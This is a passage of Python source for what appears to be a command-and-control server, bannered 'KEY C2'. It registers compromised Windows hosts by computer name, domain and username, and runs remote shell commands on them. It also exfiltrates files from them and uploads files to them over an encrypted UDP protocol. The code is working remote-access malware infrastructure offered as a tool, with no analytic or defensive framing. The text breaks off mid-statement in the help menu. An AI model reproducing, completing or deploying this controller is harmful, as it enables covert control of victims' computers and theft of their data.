import socket
import struct
import sqlite3
import os
import re
import threading
import queue
from time import sleep

from colorama import init, Fore, Style
from tqdm import tqdm
import time
import ipaddress

init(autoreset=True)
COMMON_PORT = 1269
BUFFER_SIZE = 1200

TYPE_RESET = 6
TYPE_FIRST = 0
TYPE_ACK = 2
TYPE_PING = 4
TYPE_CMD = 10
TYPE_CMD_EXEC = 12
TYPE_CMD_END = 11
TYPE_DOWN = 20
TYPE_DOWN_END = 21
TYPE_UPLO = 30
TYPE_UPLO_END = 31
TYPE_FUNC_TIME_OUT = 66
TYPE_IP_CHANGE = 99
DB_FILE = "clients.db"

selected_client_id = None
selected_client_addr = None
selected_client_port = None
current_cmd_id = 0
current_down_id = 0
current_uplo_id = 0




command_queue = queue.Queue()
stop_flag = threading.Event()

font = """
â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— 
â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•    â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â•â•â–ˆâ–ˆâ•—
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•     â–ˆâ–ˆâ•‘      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â•â•    â•šâ–ˆâ–ˆâ•”â•      â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•â• 
â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘       â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•   â•šâ•â•        â•šâ•â•â•â•â•â•â•šâ•â•â•â•â•â•â•

"""
print(Fore.LIGHTCYAN_EX +font)


def init_db():
    if not os.path.exists(DB_FILE):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''
            CREATE TABLE clients (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                port INTEGER,
                computer_name TEXT,
                domain TEXT,
                windows_version TEXT,
                username TEXT,
                last_seen TEXT
            )
        ''')
        conn.commit()
        conn.close()

from datetime import datetime

def format_relative_time_en(last_seen_str):
    if not last_seen_str:
        return "Unknown"

    last_seen = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S")
    delta = datetime.now() - last_seen

    seconds = int(delta.total_seconds())
    minutes = seconds // 60
    hours = minutes // 60
    days = delta.days

    if seconds < 60:
        return f"{seconds} seconds ago"
    elif minutes < 60:
        return f"{minutes} minutes ago"
    elif hours < 24:
        return f"{hours} hours ago"
    else:
        return f"{days} days ago"


def parse_client_info(payload):
    text = payload.decode(errors='ignore')
    computer = re.search(r"Computer Name:\s*(.*)", text)
    domain = re.search(r"Domain/Workgroup:\s*(.*)", text)
    version = re.search(r"Windows Version:\s*(.*)", text)
    username = re.search(r"Username:\s*(.*)", text)

    return {
        "computer_name": computer.group(1).strip() if computer else "",
        "domain": domain.group(1).strip() if domain else "",
        "windows_version": version.group(1).strip() if version else "",
        "username": username.group(1).strip() if username else "",
    }


def input_thread():
    global stop_flag
    while not stop_flag.is_set():
        try:
            cmd = input()
            command_queue.put(cmd)
        except Exception as e:
            continue





def insert_client(ip, port, info_dict):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()

    c.execute('''
        SELECT id FROM clients
        WHERE computer_name = ? AND username = ? AND ip = ? AND windows_version = ?
    ''', (info_dict["computer_name"], info_dict["username"], ip, info_dict["windows_version"]))
    result = c.fetchone()

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if result:
        client_id = result[0]
        c.execute('''
            UPDATE clients
            SET port = ?, last_seen = ?
            WHERE id = ?
        ''', (port, now, client_id))
        conn.commit()
        conn.close()
        return client_id

    c.execute('''
        INSERT INTO clients (ip, port, computer_name, domain, windows_version, username, last_seen)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (ip, port, info_dict["computer_name"], info_dict["domain"],
          info_dict["windows_version"], info_dict["username"], now))

    client_id = c.lastrowid
    conn.commit()
    conn.close()
    print(Fore.LIGHTGREEN_EX + f"New client => client id: {client_id}")
    return client_id

def update_client_last_seen_and_endpoint(client_id, ip, port):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()

        c.execute('SELECT ip, port FROM clients WHERE id = ?', (client_id,))
        row = c.fetchone()
        if not row:
            return None

        current_ip, current_port = row

        if current_ip != ip or current_port != port:
            c.execute('''
                UPDATE clients
                SET ip = ?, port = ?, last_seen = ?
                WHERE id = ?
            ''', (ip, port, now, client_id))
        else:
            c.execute('''
                UPDATE clients
                SET last_seen = ?
                WHERE id = ?
            ''', (now, client_id))

        conn.commit()

        c.execute('SELECT ip, port, last_seen FROM clients WHERE id = ?', (client_id,))
        updated = c.fetchone()
        return 1

def delete_client_by_id(client_id: int) -> bool:

    if not isinstance(client_id, int):
        return 0
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("DELETE FROM clients WHERE id = ?", (client_id,))
        conn.commit()
        return 1

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", COMMON_PORT))
    return s


def parse_packet(data):
    if len(data) > 10:
        pkt_type = data[0]
        client_id = struct.unpack('<I', data[1:5])[0]
        pkt_id = struct.unpack('<I', data[5:9])[0]
        length = struct.unpack('<H', data[9:11])[0]
        payload = data[11:11 + length]
        return pkt_type, client_id, pkt_id, length, payload
    elif len(data) <= 10:
        pkt_type = data[0]
        client_id = struct.unpack('<I', data[1:5])[0]
        length = struct.unpack('<H', data[5:7])[0]
        payload = data[7:7 + length]
        return pkt_type, client_id, length, payload

def send_ack_with_id(sock, addr, client_id):
    ack = struct.pack('<B I I H', TYPE_ACK, client_id, 0, 0)
    sock.sendto(ack, addr)


from datetime import datetime
from colorama import Fore, Style

def check_clients_online(sock):
    global selected_client_port
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, ip, port, computer_name, domain, windows_version, username, last_seen FROM clients")
    clients = c.fetchall()
    conn.close()

    client_statuses = []

    for client in clients:
        client_id, ip, port, name, domain, version, username, last_seen = client

        client_statuses.append({
            "id": client_id,
            "ip": ip,
            "port": port,
            "name": name,
            "domain": domain,
            "version": version,
            "username": username,
            "last_seen": last_seen
        })

    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "\n[+] Client List (after online check):")
    print(
        Fore.LIGHTYELLOW_EX + "ID | IP Address       | Port |  Computer Name  |  Username  |   Domain    |         Win Ver         |  Last Seen")

    for c in client_statuses:
        print(Style.BRIGHT + Fore.LIGHTYELLOW_EX + "--------------------------------------------------------------------------------------------------------------------")

        relative_time = format_relative_time_en(c["last_seen"])

        line_color = Fore.LIGHTWHITE_EX
        if c["last_seen"]:
            try:
                last_seen_dt = datetime.strptime(c["last_seen"], "%Y-%m-%d %H:%M:%S")
                delta_seconds = (datetime.now() - last_seen_dt).total_seconds()

                if delta_seconds < 5 * 60:
                    line_color = Fore.LIGHTGREEN_EX
                elif delta_seconds > 60 * 60:
                    line_color = Fore.LIGHTRED_EX
            except Exception:
                pass

        print(
            Style.BRIGHT + line_color +
            f"{c['id']:<3}| {c['ip']:<16} | {c['port']:<5}| {c['name']:<15} | {c['username']:<10} | {c['domain']:<10} | {c['version']:<15} | {relative_time}"
        )
    print()






def cmd_run(sock):
    global selected_client_addr
    global selected_client_id
    global current_cmd_id
    global selected_client_port
    current_cmd_id = 0
    try:
        seq = 1
        while True:
            while True:
                if not command_queue.empty():
                    cmd = command_queue.get()
                    if cmd == "exit":
                        while True:
                            ping_packet = struct.pack('<B I I H', TYPE_CMD_END, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            sock.settimeout(2)
                            try:
                                data, addr = sock.recvfrom(BUFFER_SIZE)
                                if data and addr == selected_client_addr:
                                    pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)
                                    if pkt_type == TYPE_CMD_END:
                                        return
                                    if pkt_type == TYPE_FUNC_TIME_OUT:
                                        ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0,0)
                                        sock.sendto(ping_packet, selected_client_addr)
                                        print(Fore.RED + "Function Timed Out!\nExiting...")
                                        return
                                    if pkt_type == TYPE_RESET:
                                        ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                                        sock.sendto(ping_packet, selected_client_addr)
                                        return

                            except socket.timeout:
                                continue
                        break

                    payload = cmd.encode()
                    payload = encrypt_bytes(payload)
                    ping_packet = struct.pack('<B I I H', TYPE_CMD, selected_client_id, seq, len(payload)) + payload
                    sock.sendto(ping_packet, selected_client_addr)
                    sock.settimeout(5)
                try:
                    data, addr = sock.recvfrom(BUFFER_SIZE)
                    if data and addr == selected_client_addr:
                        pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)
                        if pkt_type == TYPE_FUNC_TIME_OUT:
                            ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            print(Fore.RED + "Function Timed Out!\nExiting...")
                            return
                        if pkt_type == TYPE_ACK and pkt_id == seq:
                            seq += 1
                            break
                        if pkt_type == TYPE_CMD:
                            ping_packet = struct.pack('<B I I H', TYPE_ACK,selected_client_id, pkt_id, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            if pkt_id > current_cmd_id:
                                buf_cmd = decrypt_bytes(buf_cmd)
                                print(buf_cmd.decode(errors="ignore"))
                                current_cmd_id = pkt_id
                        if pkt_type == TYPE_RESET:
                            ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            return
                except socket.timeout:

                    continue
    except KeyboardInterrupt:
        i = 0
        while True:
            if i == 6:
                break
            i = i + 1
            print(Fore.RED +f"\nTry ({i}) Time Exiting from CMD ...\n")
            ping_packet = struct.pack('<B I I H', TYPE_CMD_END, selected_client_id, 0, 0)
            sock.sendto(ping_packet, selected_client_addr)
            sock.settimeout(2)
            try:
                data, addr = sock.recvfrom(BUFFER_SIZE)
                if data and addr == selected_client_addr:
                    pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)
                    if pkt_type == TYPE_FUNC_TIME_OUT:
                        ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                        sock.sendto(ping_packet, selected_client_addr)
                        print(Fore.RED + "Function Timed Out!\nExiting...")
                        return
                    if pkt_type == TYPE_CMD_END:
                        return
                if pkt_type == TYPE_RESET:
                    ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                    sock.sendto(ping_packet, selected_client_addr)
                    return
            except socket.timeout:
                continue

        return



def cmdexec_run(sock):
    global selected_client_addr
    global selected_client_id
    global current_cmd_id
    global selected_client_port
    current_cmd_id = 0
    try:
        seq = 1
        while True:
            while True:
                if not command_queue.empty():
                    cmd = command_queue.get()
                    if cmd == "exit":
                        while True:
                            ping_packet = struct.pack('<B I I H', TYPE_CMD_END, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            sock.settimeout(2)
                            try:
                                data, addr = sock.recvfrom(BUFFER_SIZE)
                                if data and addr == selected_client_addr:
                                    pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)
                                    if pkt_type == TYPE_CMD_END:
                                        return
                                    if pkt_type == TYPE_FUNC_TIME_OUT:
                                        ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0,0)
                                        sock.sendto(ping_packet, selected_client_addr)
                                        print(Fore.RED + "Function Timed Out!\nExiting...")
                                        return
                                    if pkt_type == TYPE_RESET:
                                        ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                                        sock.sendto(ping_packet, selected_client_addr)
                                        return

                            except socket.timeout:
                                continue
                        break

                    payload = cmd.encode()
                    payload = encrypt_bytes(payload)
                    ping_packet = struct.pack('<B I I H', TYPE_CMD, selected_client_id, seq, len(payload)) + payload
                    sock.sendto(ping_packet, selected_client_addr)
                    sock.settimeout(5)
                try:
                    data, addr = sock.recvfrom(BUFFER_SIZE)
                    if data and addr == selected_client_addr:
                        pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)
                        if pkt_type == TYPE_FUNC_TIME_OUT:
                            ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            print(Fore.RED + "Function Timed Out!\nExiting...")
                            return
                        if pkt_type == TYPE_ACK and pkt_id == seq:
                            seq += 1
                            break
                        if pkt_type == TYPE_CMD:
                            ping_packet = struct.pack('<B I I H', TYPE_ACK,selected_client_id, pkt_id, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            if pkt_id > current_cmd_id:
                                buf_cmd = decrypt_bytes(buf_cmd)
                                print(buf_cmd.decode(errors="ignore"))
                                current_cmd_id = pkt_id
                        if pkt_type == TYPE_RESET:
                            ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            return
                except socket.timeout:

                    continue
    except KeyboardInterrupt:
        i = 0
        while True:
            if i == 6:
                break
            i = i + 1
            print(Fore.RED +f"\nTry ({i}) Time Exiting from CMD ...\n")
            ping_packet = struct.pack('<B I I H', TYPE_CMD_END, selected_client_id, 0, 0)
            sock.sendto(ping_packet, selected_client_addr)
            sock.settimeout(2)
            try:
                data, addr = sock.recvfrom(BUFFER_SIZE)
                if data and addr == selected_client_addr:
                    pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)
                    if pkt_type == TYPE_FUNC_TIME_OUT:
                        ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                        sock.sendto(ping_packet, selected_client_addr)
                        print(Fore.RED + "Function Timed Out!\nExiting...")
                        return
                    if pkt_type == TYPE_CMD_END:
                        return
                if pkt_type == TYPE_RESET:
                    ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                    sock.sendto(ping_packet, selected_client_addr)
                    return
            except socket.timeout:
                continue

        return


def download_run(sock):
    global current_down_id
    global selected_client_addr
    global selected_client_id
    global selected_client_port
    current_down_id = 0
    print(Fore.YELLOW +"send path file for download from client :")
    while True:
        try:
            if not command_queue.empty():
                filepath = command_queue.get()
                filepath = filepath.encode()
                break
        except KeyboardInterrupt:
            while True:
                print(Fore.RED + "\nExiting from DOWNLOAD ...\n")
                ping_packet = struct.pack('<B I I H', TYPE_DOWN_END, selected_client_id, 0, 0)
                sock.sendto(ping_packet, selected_client_addr)
                sock.settimeout(0.2)
                try:
                    data, addr = sock.recvfrom(BUFFER_SIZE)
                    if data and addr == selected_client_addr:
                        pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)

                        if pkt_type == TYPE_FUNC_TIME_OUT:
                            ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            print(Fore.RED + "Function Timed Out!\nExiting...")
                            return
                        if pkt_type == TYPE_DOWN_END:
                            return
                        if pkt_type == TYPE_RESET:
                            ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            return
                except socket.timeout:
                    continue



    chunck_count = 0
    print(Fore.YELLOW +"send file name for save file in server :")

    while True:
        try:
            if not command_queue.empty():
                filename = command_queue.get()
                filename = filename.encode()
                break
        except KeyboardInterrupt:
            while True:
                print(Fore.RED + "\nExiting from DOWNLOAD ...\n")
                ping_packet = struct.pack('<B I I H', TYPE_DOWN_END, selected_client_id, 0, 0)
                sock.sendto(ping_packet, selected_client_addr)
                sock.settimeout(0.2)
                try:
                    data, addr = sock.recvfrom(BUFFER_SIZE)
                    if data and addr == selected_client_addr:
                        pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)

                        if pkt_type == TYPE_FUNC_TIME_OUT:
                            ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            print(Fore.RED + "Function Timed Out!\nExiting...")
                            return
                        if pkt_type == TYPE_DOWN_END:
                            return
                        if pkt_type == TYPE_RESET:
                            ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            return
                except socket.timeout:
                    continue

    try:


        while True:

            payload = filepath
            payload = encrypt_bytes(payload)
            ping_packet = struct.pack('<B I I H', TYPE_DOWN, selected_client_id, 0, len(payload)) + payload
            sock.sendto(ping_packet, selected_client_addr)
            sock.settimeout(2)
            try:
                data, addr = sock.recvfrom(BUFFER_SIZE)
                if data and addr == selected_client_addr:
                    pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)
                    if pkt_type == TYPE_FUNC_TIME_OUT:
                        ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                        sock.sendto(ping_packet, selected_client_addr)
                        print(Fore.RED + "Function Timed Out!\nExiting...")
                        return
                    if pkt_type == TYPE_ACK:
                        filesize = int(buf_cmd)
                        chunck_count = filesize/BUFFER_SIZE
                        if filesize > BUFFER_SIZE * chunck_count:
                            chunck_count += 1
                        break
                    if pkt_type == TYPE_RESET:
                        ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                        sock.sendto(ping_packet, selected_client_addr)
                        return
                else:
                    continue
            except socket.timeout:
                continue
        print(Fore.LIGHTGREEN_EX +"\n[+] File path send to client.")

        print(Fore.LIGHTGREEN_EX +"\n[+] Start Downloading ...")
        with open(filename, "wb") as f:
            seq = 1
            desc_text = Fore.CYAN + Style.BRIGHT + "ðŸ“¥ Downloading"
            chunck_count = int(chunck_count)
            pbar = tqdm(total=chunck_count, desc=desc_text, unit="chunk", ncols=100,
                        bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [Time Remaining: {remaining}]",
                        dynamic_ncols=True)
            start_time = time.time()
            while True:

                try:
                    sock.settimeout(0.7)
                    data, addr = sock.recvfrom(BUFFER_SIZE)
                    if data and addr == selected_client_addr:
                        pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)

                        if pkt_type == TYPE_FUNC_TIME_OUT:
                            ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            print(Fore.RED + "Function Timed Out!\nExiting...")
                            return

                        if pkt_type == TYPE_DOWN:

                            if pkt_id > current_down_id:
                                buf_cmd = decrypt_bytes(buf_cmd)
                                f.write(buf_cmd)
                                current_down_id = pkt_id
                                ping_packet = struct.pack('<B I I H', TYPE_DOWN, selected_client_id, pkt_id, 0)
                                sock.sendto(ping_packet, selected_client_addr)
                                seq += 1
                                pbar.update(1)
                            if pkt_id <= current_down_id:
                                ping_packet = struct.pack('<B I I H', TYPE_DOWN, selected_client_id, pkt_id, 0)
                                sock.sendto(ping_packet, selected_client_addr)
                        if pkt_type == TYPE_DOWN_END and pkt_id == 0:
                            ping_packet = struct.pack('<B I I H', TYPE_DOWN_END, selected_client_id, 0,0)
                            sock.sendto(ping_packet, selected_client_addr)
                            pbar.close()
                            print(Fore.LIGHTGREEN_EX + "[âœ“] Download done.")
                            return
                        if pkt_type == TYPE_RESET:
                            ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            return

                except socket.timeout:

                    continue
    except KeyboardInterrupt:
        while True:
            print(Fore.RED +"\nExiting from DOWNLOAD ...\n")
            ping_packet = struct.pack('<B I I H', TYPE_DOWN_END, selected_client_id, 0, 0)
            sock.sendto(ping_packet, selected_client_addr)
            sock.settimeout(0.2)
            try:
                data, addr = sock.recvfrom(BUFFER_SIZE)
                if data and addr == selected_client_addr:
                    pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)

                    if pkt_type == TYPE_FUNC_TIME_OUT:
                        ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                        sock.sendto(ping_packet, selected_client_addr)
                        print(Fore.RED + "Function Timed Out!\nExiting...")
                        return
                    if pkt_type == TYPE_DOWN_END:
                        return
                    if pkt_type == TYPE_RESET:
                        ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                        sock.sendto(ping_packet, selected_client_addr)
                        return
            except socket.timeout:
                continue

        return





def upload_run(sock):
    global current_uplo_id
    global selected_client_addr
    global selected_client_id
    global selected_client_port
    current_uplo_id = 0
    print(Fore.YELLOW +"send path file from server for upload to client :")
    while True:
        try:
            if not command_queue.empty():
                filepath = command_queue.get()
                break
        except KeyboardInterrupt:
            while True:
                print(Fore.RED + "\nExiting from UPLOAD ...\n")
                ping_packet = struct.pack('<B I I H', TYPE_UPLO_END, selected_client_id, 0, 0)
                sock.sendto(ping_packet, selected_client_addr)
                sock.settimeout(0.2)
                try:
                    data, addr = sock.recvfrom(BUFFER_SIZE)
                    if data and addr == selected_client_addr:
                        pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)

                        if pkt_type == TYPE_FUNC_TIME_OUT:
                            ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            print(Fore.RED + "Function Timed Out!\nExiting...")
                            return
                        if pkt_type == TYPE_UPLO_END:
                            return
                        if pkt_type == TYPE_RESET:
                            ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            return
                except socket.timeout:
                    continue

    chunk_count = 0
    print(Fore.YELLOW +"send path file for save file in client :")

    while True:
        try:
            if not command_queue.empty():
                filename = command_queue.get()
                break
        except KeyboardInterrupt:
            while True:
                print(Fore.RED + "\nExiting from UPLOAD ...\n")
                ping_packet = struct.pack('<B I I H', TYPE_UPLO_END, selected_client_id, 0, 0)
                sock.sendto(ping_packet, selected_client_addr)
                sock.settimeout(0.2)
                try:
                    data, addr = sock.recvfrom(BUFFER_SIZE)
                    if data and addr == selected_client_addr:
                        pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)

                        if pkt_type == TYPE_FUNC_TIME_OUT:
                            ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            print(Fore.RED + "Function Timed Out!\nExiting...")
                            return
                        if pkt_type == TYPE_UPLO_END:
                            return
                        if pkt_type == TYPE_RESET:
                            ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                            sock.sendto(ping_packet, selected_client_addr)
                            return
                except socket.timeout:
                    continue

    try:

        while True:
            file_size = os.path.getsize(filepath)
            chunk_count = (file_size/(BUFFER_SIZE - 11)) + 1

            payload = filename + "#" + str(file_size)
            payload = payload.encode()
            payload = encrypt_bytes(payload)
            ping_packet = struct.pack('<B I I H', TYPE_UPLO, selected_client_id, 0, len(payload)) + payload
            sock.sendto(ping_packet, selected_client_addr)
            sock.settimeout(2)
            try:
                data, addr = sock.recvfrom(BUFFER_SIZE)
                if data and addr == selected_client_addr:
                    pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)
                    try:
                        buf_cmd = buf_cmd.decode("utf-8")
                    except UnicodeDecodeError:
                        # fallback
                        buf_cmd = buf_cmd.decode("latin-1", errors="ignore")

                    if pkt_type == TYPE_FUNC_TIME_OUT:
                        ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                        sock.sendto(ping_packet, selected_client_addr)
                        print(Fore.RED + "Function Timed Out!\nExiting...")
                        return

                    if pkt_type == TYPE_ACK:
                        if buf_cmd == "1":
                            print(Fore.RED +"path not True!\nTry again for Uploading.\n")
                            return
                        if buf_cmd == "0":
                            print(Fore.CYAN +"path is True.\n")
                            break
                    if pkt_type == TYPE_RESET:
                        ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                        sock.sendto(ping_packet, selected_client_addr)
                        return
                else:
                    continue
            except socket.timeout:
                continue
        print(Fore.LIGHTGREEN_EX +"\n[+] Start Uploading ...")
        with open(filepath, "rb") as f:
            seq = 1
            current_uplo_id = 0
            desc_text = Fore.CYAN + Style.BRIGHT + "ðŸ“¥ Uploading"
            chunk_count = int(chunk_count)
            pbar = tqdm(total=chunk_count, desc=desc_text, unit="chunk", ncols=100,
                        bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [Time Remaining: {remaining}]",
                        dynamic_ncols=True)
            start_time = time.time()
            while True:
                chunk = f.read((BUFFER_SIZE - 11))
                if not chunk:
                    pbar.close()
                    break
                while True:
                    pkt_id = seq
                    chunk = encrypt_bytes(chunk)
                    ping_packet = struct.pack('<B I I H', TYPE_UPLO, selected_client_id, pkt_id, len(chunk)) + chunk
                    sock.sendto(ping_packet, selected_client_addr)
                    sock.settimeout(2)
                    try:
                        data, addr = sock.recvfrom(BUFFER_SIZE)
                        if data and addr == selected_client_addr:
                            pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)
                            if pkt_type == TYPE_FUNC_TIME_OUT:
                                ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                                sock.sendto(ping_packet, selected_client_addr)
                                print(Fore.RED + "Function Timed Out!\nExiting...")
                                return
                            if pkt_type == TYPE_UPLO:
                                if pkt_id == (current_uplo_id + 1):
                                    seq += 1
                                    current_uplo_id += 1
                                    pbar.update(1)
                                    break
                            if pkt_type == TYPE_RESET:
                                ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                                sock.sendto(ping_packet, selected_client_addr)
                                return
                    except socket.timeout:
                        continue
        while True:
            ping_packet = struct.pack('<B I I H', TYPE_UPLO_END, selected_client_id, 0, 0)
            sock.sendto(ping_packet, selected_client_addr)
            sock.settimeout(2)
            try:
                data, addr = sock.recvfrom(BUFFER_SIZE)
                if data and addr == selected_client_addr:
                    pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)
                    if pkt_type == TYPE_FUNC_TIME_OUT:
                        ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                        sock.sendto(ping_packet, selected_client_addr)
                        print(Fore.RED + "Function Timed Out!\nExiting...")
                        return
                    if pkt_type == TYPE_UPLO_END:
                        print(Fore.LIGHTGREEN_EX + "[âœ“] Upload done.")
                        pbar.close()
                        break
                    if pkt_type == TYPE_RESET:
                        ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                        sock.sendto(ping_packet, selected_client_addr)
                        return
            except socket.timeout:
                continue
    except KeyboardInterrupt:
        while True:
            print(Fore.RED +"\nExiting from UPLOAD ...\n")
            ping_packet = struct.pack('<B I I H', TYPE_UPLO_END, selected_client_id, 0, 0)
            sock.sendto(ping_packet, selected_client_addr)
            sock.settimeout(0.2)
            try:
                data, addr = sock.recvfrom(BUFFER_SIZE)
                if data and addr == selected_client_addr:
                    pkt_type, cli_id, pkt_id, length, buf_cmd = parse_packet(data)

                    if pkt_type == TYPE_FUNC_TIME_OUT:
                        ping_packet = struct.pack('<B I I H', TYPE_FUNC_TIME_OUT, selected_client_id, 0, 0)
                        sock.sendto(ping_packet, selected_client_addr)
                        print(Fore.RED + "Function Timed Out!\nExiting...")
                        return
                    if pkt_type == TYPE_UPLO_END:
                        return
                    if pkt_type == TYPE_RESET:
                        ping_packet = struct.pack('<B I I H', TYPE_RESET, selected_client_id, 0, 0)
                        sock.sendto(ping_packet, selected_client_addr)
                        return
            except socket.timeout:
                continue
        return


def hintprint():
    print(Fore.LIGHTWHITE_EX + "+" + "-" * 67 + "+")
    print(
        Fore.LIGHTWHITE_EX + "|  " + Style.BRIGHT + Fore.LIGHTGREEN_EX + "list              :" + Style.RESET_ALL + Fore.YELLOW + " Get information of all connected clients " + Fore.LIGHTWHITE_EX + "    |")
    print(
        Fore.LIGHTWHITE_EX + "|  " + Style.BRIGHT + Fore.LIGHTGREEN_EX + "select <id>       :" + Style.RESET_ALL + Fore.YELLOW + " Select a client to connect                 " + Fore.LIGHTWHITE_EX + "  |")
    print(
        Fore.LIGHTWHITE_EX + "|  " + Style.BRIGHT + Fore.LIGHTGREEN_EX + "cmd               :" + Style.RESET_ALL + Fore.YELLOW + " Open command prompt on selected client     " + Fore.LIGHTWHITE_EX + "  |")
    print(
